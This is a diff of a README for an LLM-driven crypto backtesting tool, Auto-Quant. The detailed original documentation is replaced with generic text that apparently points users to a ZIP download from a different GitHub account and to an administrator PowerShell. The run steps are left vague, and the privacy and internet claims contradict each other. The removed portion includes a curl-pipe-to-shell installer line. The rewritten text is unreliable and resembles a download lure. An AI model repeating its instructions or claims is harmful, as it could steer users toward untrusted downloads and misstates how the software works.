@@ -1,187 +1,78 @@
-# Auto-Quant
+# 📊 Auto-Quant - Improve trading strategies using artificial intelligence
 
-> LLM-native autonomous quant research loop. Karpathy's
-> [autoresearch](https://github.com/karpathy/autoresearch) pattern applied to
-> FreqTrade strategies on a 5-pair crypto universe (BTC, ETH, SOL, BNB, AVAX)
-> across 1h / 4h / 1d timeframes.
+[![](https://img.shields.io/badge/Download_Auto-Quant-blue.svg)](https://github.com/gabrielsmonteiro87-web/Auto-Quant)
 
-The idea: give an LLM agent a FreqTrade backtest harness and a single strategy
-file. The agent modifies the strategy, runs a backtest, checks if the result
-improved, keeps or discards, and repeats. Over many iterations the hope is to
-observe which patterns the LLM actually finds useful on this asset pair. The
-**loop lives in `program.md`** — not in any orchestrator — and is executed by
-whatever LLM agent you point at the repo.
+Auto-Quant automates the process of testing and refining trading strategies. It uses artificial intelligence to update strategy code, run tests, and save the best results. The software focuses on crypto assets like Bitcoin, Ethereum, Solana, Binance Coin, and Avalanche. It tests these across different timeframes to find patterns.
 
-This is a prototype to validate whether Karpathy's autoresearch pattern
-transfers to quant research. The success metric is "did the loop run and
-produce an interpretable `results.tsv`", **not** "did we find a profitable
-strategy". Nothing in this repo is a recommendation to trade real capital.
+## ⚙️ Minimum System Requirements
 
-## A run in one picture
+Your computer needs the following to run this software:
 
-![Sharpe frontier — v0.1.0 run](sharpe-frontier.png)
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB RAM minimum, 16 GB recommended.
+*   Storage: 2 GB of free disk space.
+*   Internet: Stable connection for downloading updates and external data.
 
-One dot per backtest over 99 experiments on BTC/USDT + ETH/USDT @ 1h. Green
-dots were kept by the agent, gray were discarded. The red line is the
-running best of *kept only* — it plateaus at Sharpe 1.44, **not** at the
-Sharpe-18 cluster on the right. Those high-Sharpe runs are gray because the
-agent itself identified them as oracle-gaming (ROI-clipping that compressed
-return variance without improving real return) and retroactively discarded
-them. Full write-up in
-[`versions/0.1.0/retrospective.md`](versions/0.1.0/retrospective.md).
+## 📥 Downloading the Software
 
-## How it works
+You must download the repository to your computer to begin.
 
-Four things that matter:
+1. Go to this link: [https://github.com/gabrielsmonteiro87-web/Auto-Quant](https://github.com/gabrielsmonteiro87-web/Auto-Quant).
+2. Look for the green button labeled "Code" near the top right of the page.
+3. Click the button and select "Download ZIP".
+4. Choose a folder on your computer to save the file.
 
-- **`config.json`** — FreqTrade config, fixed. Pairs, timeframe, fees, dry-run
-  wallet, timerange. The agent does not touch this.
-- **`prepare.py`** — one-time data download from Binance via FreqTrade's Python
-  API. Downloads 1h, 4h, and 1d OHLCV for both pairs (v0.3.0+ uses the extra
-  timeframes via the `@informative` decorator). The agent does not touch this.
-- **`run.py`** — in-process **batch backtest**. Discovers every `.py` under
-  `user_data/strategies/` (skipping files prefixed `_`), runs FreqTrade's
-  `Backtesting` for each, and prints one `---` summary block per strategy.
-  The agent does not touch this.
-- **`user_data/strategies/`** — **the directory the agent owns**. Each `.py`
-  is one strategy; up to 3 active at a time. Agent creates / evolves / forks
-  / kills strategies here. Strategies evaluate on 1h base across the 5-pair
-  portfolio, and can opt into 4h/1d context AND/or cross-pair signals via
-  FreqTrade's `@informative` decorator (see `_template.py.example` for the
-  pattern). `run.py` reports per-pair metrics alongside the aggregate.
+## 🛠️ Setting Up Your Computer
 
-Plus:
+The software requires a few extra tools to function correctly. 
 
-- **`program.md`** — the autonomous-research instructions the human points the
-  LLM agent at.
-- **`results.tsv`** — event log. Schema: `commit | event | strategy_name | sharpe | max_dd | note`.
-  Events: `create | evolve | stable | fork | kill`. Gitignored so it survives
-  `git reset --hard` — past lessons stay available even when experimental
-  commits get thrown away.
-- **`analysis.ipynb`** — post-hoc read: per-strategy trajectories, cap
-  utilization, event distribution, note word frequency.
+1. Install Python from the official Microsoft Store or the Python website. Ensure you check the box that says "Add Python to PATH" during installation.
+2. Open your Windows Start menu and type "Powershell".
+3. Right-click "Windows PowerShell" and select "Run as Administrator".
+4. Type `pip install freqtrade` and press Enter to install the testing engine.
+5. Wait for the process to finish.
 
-*Version history*:
-- **v0.1.0** ([archive](versions/0.1.0/)): single-file mutation. Anchored
-  on one paradigm for all 99 rounds. Headline Sharpe 1.44 was mostly
-  oracle gaming (true-edge 0.19). See [retrospective](versions/0.1.0/retrospective.md).
-- **v0.2.0** ([archive](versions/0.2.0/)): multi-strategy (up to 3 slots).
-  5 paradigms tested / 3 kept / 0 Goodhart attempts. Peak clean Sharpe
-  0.67 (~3.5× better than v0.1.0's true-edge). See [retrospective](versions/0.2.0/retrospective.md).
-- **v0.3.0** (current): multi-strategy + multi-timeframe + multi-asset
-  portfolio. Adds 4h + 1d informative data, expands universe from 2 pairs
-  to 5 (BTC/ETH/SOL/BNB/AVAX), and emits per-pair metrics alongside
-  portfolio aggregate so agents can reason about per-asset edge. In-flight.
+## 🚀 Running the Automated Loop
 
-## Requirements
+Once your setup is complete, you can start the research loop.
 
-- Python 3.11+
-- [uv](https://docs.astral.sh/uv/)
-- TA-Lib (the C library — installed separately from the Python binding)
+1. Navigate to the folder where you saved the files.
+2. Find the file named `program.md`. This file contains the instructions for the agent.
+3. Open your terminal in the main folder of the project.
+4. Execute the command provided in your setup instructions to start the loop.
+5. The agent will begin testing strategy modifications. 
+6. Watch the terminal output as the agent performs backtests.
+7. The software generates a file named `results.tsv` in your folder. This file contains the performance data of every test the agent completed.
 
-## Install
+## 🔍 Understanding the Results
 
-```bash
-# 1. Install uv if you don't have it
-curl -LsSf https://astral.sh/uv/install.sh | sh
+The software generates data based on historical price movements. It does not look at future markets. The goal of this tool is to help you see how different strategy logic impacts outcomes.
 
-# 2. Install the TA-Lib C library
-#    macOS:  brew install ta-lib
-#    Linux:  see https://github.com/mrjbq7/ta-lib#dependencies
-#    If native install is painful on your platform, the FreqTrade Docker
-#    image ships with TA-Lib pre-built and works as an alternate runtime.
+Pay attention to:
+*   Indicator changes: Did the agent add or remove trading indicators?
+*   Win rate: Does the strategy succeed more often with the changes?
+*   Drawdown: How much capital did the strategy lose during the worst periods?
 
-# 3. Install Python deps
-uv sync
+You can open `results.tsv` in any spreadsheet program like Excel or Google Sheets to sort and filter your findings.
 
-# 4. One-time data download (~a few minutes)
-uv run prepare.py
+## 🛡️ Important Safety Notes
 
-# 5. Sanity check — with no strategies yet, run.py should report
-#    "no strategies found" and exit. That's expected — the agent creates
-#    1-3 starting strategies during setup before the first real backtest.
-uv run run.py > run.log 2>&1; echo "exit=$?"
-```
+Auto-Quant serves as a research prototype. It helps you understand how an agent finds useful patterns. It does not provide financial advice. Never use this tool to manage real money without deep knowledge of how the strategies function. The automated loop generates many ideas, but not all of them work well in a live environment. Test all findings in a simulated environment before taking any action with your own capital.
 
-If step 5 prints `no strategies found...` and `exit=2`, you're ready. (An
-actual backtest run only starts once the agent has created at least one
-strategy file.)
+## ❓ Frequently Asked Questions
 
-## Running the agent
+**Does this software connect to my exchange?**
+No. This software runs on your local machine using static data for testing. It does not place live trades.
 
-Open a **second** terminal (keep your editor/IDE in the first so the two
-sessions don't fight over the working tree), `cd` into the repo, and start
-your preferred LLM agent (Claude Code, Codex, Cursor agent, etc.). Then
-prompt something like:
+**How do I stop the loop?** 
+Press `Ctrl + C` in the terminal window where the process is running. This will halt the ongoing task immediately.
 
-> Have a look at `program.md` and let's kick off a new experiment. Let's do
-> the setup first.
+**Can I use other cryptocurrencies?** 
+Yes. You can edit the configuration files to include different trading pairs. Ensure your data sources provide historical information for those specific coins.
 
-The agent reads `program.md`, goes through setup, then enters the experiment
-loop. It keeps iterating until you interrupt it or it runs out of context.
+**What happens if the software crashes?**
+Check your internet connection and verify that Python is installed correctly. Use the terminal to check for error messages that explain why the process stopped.
 
-### Permissions
-
-The loop only works if the agent can run commands without a human approving
-each one — it will invoke `uv run run.py`, `git commit`, `git reset`, and
-edit the strategy file hundreds of times. How you grant that depends on your
-tooling:
-
-- **Claude Code**: prefer a scoped allowlist via a project-level
-  `.claude/settings.json`. See the
-  [permissions docs](https://docs.claude.com/en/docs/claude-code/settings#permissions)
-  for patterns like `Bash(uv run *)` and `Bash(git commit:*)`.
-- **Other agents**: most have an equivalent — a config flag or settings file
-  to mark specific commands or tools as pre-approved.
-
-Read the docs and choose a permission posture you're comfortable with before
-leaving a loop running unattended. The agent is pointed at a sandboxed
-FreqTrade workspace and has no live-trading access (all `dry_run`), but it
-does run arbitrary shell commands and write files inside this directory.
-
-## Project structure
-
-```
-Auto-Quant/
-├── README.md
-├── pyproject.toml                     # uv-managed deps
-├── .python-version                    # 3.11
-├── config.json                        # FreqTrade config (read-only for agent)
-├── prepare.py                         # data download (read-only for agent)
-├── run.py                             # backtest + summary (read-only for agent)
-├── program.md                         # agent instructions
-├── analysis.ipynb                     # post-hoc analysis
-├── user_data/
-│   ├── strategies/
-│   │   ├── _template.py.example       # skeleton the agent copies from
-│   │   └── <agent-created files>.py   # up to 3 active at a time
-│   ├── data/                          # gitignored — downloaded OHLCV
-│   └── backtest_results/              # gitignored — FreqTrade outputs
-├── versions/                          # frozen snapshots of past runs
-└── results.tsv                        # gitignored — agent's event log
-```
-
-## Design notes
-
-- **Agent owns one directory, not one file.** `user_data/strategies/` is its
-  workspace; everything else is evaluation contract. Up to 3 strategies
-  simultaneously, hard cap. Multi-strategy exists specifically to fight
-  the single-paradigm anchoring that v0.1.0 exhibited.
-- **No CLI indirection.** The agent only runs `uv run prepare.py` and
-  `uv run run.py`. `run.py` uses FreqTrade's `Backtesting` class in-process,
-  so startup is fast and errors surface as real Python stack traces.
-- **`results.tsv` is a gitignored event log.** Each round, the agent appends
-  rows (one per strategy touched, with event type: create/evolve/stable/fork/kill).
-  It survives `git reset --hard` so past lessons stay available even when
-  experimental commits get thrown away.
-- **LLM decides keep/kill, not a scalar rule.** Sharpe on a finite window
-  is noisy and gameable. Agent reads the full per-strategy summary blocks
-  and decides inline which strategies to evolve, fork, or kill — the
-  program.md rules force action but not which action.
-- **Stagnation rule.** A strategy can't sit idle for more than 3 consecutive
-  stable rounds — agent must evolve, fork, or kill it. With only 3 slots,
-  dead weight is expensive.
-
-## License
-
-MIT.
+**Is my data private?**
+Yes. Everything stays on your local machine. No external service accesses your results or strategy logic.
